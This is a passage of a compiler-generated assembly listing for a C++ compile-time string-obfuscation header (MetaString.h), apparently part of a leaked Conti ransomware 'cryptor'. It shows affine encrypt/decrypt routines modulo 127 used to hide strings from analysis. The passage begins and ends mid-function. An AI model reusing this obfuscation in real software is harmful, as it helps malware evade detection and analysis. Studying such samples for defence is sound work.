  00463	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00468	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0046f	88 41 1a	 mov	 BYTE PTR [rcx+26], al
  00472	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00479	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  0047d	88 85 c0 00 00
	00		 mov	 BYTE PTR tv280[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00483	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0048a	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00491	5f		 pop	 rdi
  00492	5d		 pop	 rbp
  00493	c3		 ret	 0
??0?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 30	 sub	 eax, 48			; 00000030H
  0002d	6b c0 09	 imul	 eax, eax, 9
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 71	 imul	 eax, eax, 113		; 00000071H
  0002d	83 c0 30	 add	 eax, 48			; 00000030H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0c	 cmp	 QWORD PTR i$1[rbp], 12
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv182 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0022d	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00231	88 85 c0 00 00
	00		 mov	 BYTE PTR tv182[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00237	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0023e	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00245	5f		 pop	 rdi
  00246	5d		 pop	 rbp
  00247	c3		 ret	 0
??0?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 0b	 sub	 eax, 11
  0002d	6b c0 c1	 imul	 eax, eax, -63		; ffffffffffffffc1H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	8d 44 00 0b	 lea	 eax, DWORD PTR [rax+rax+11]
  0002e	99		 cdq
  0002f	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00034	f7 f9		 idiv	 ecx
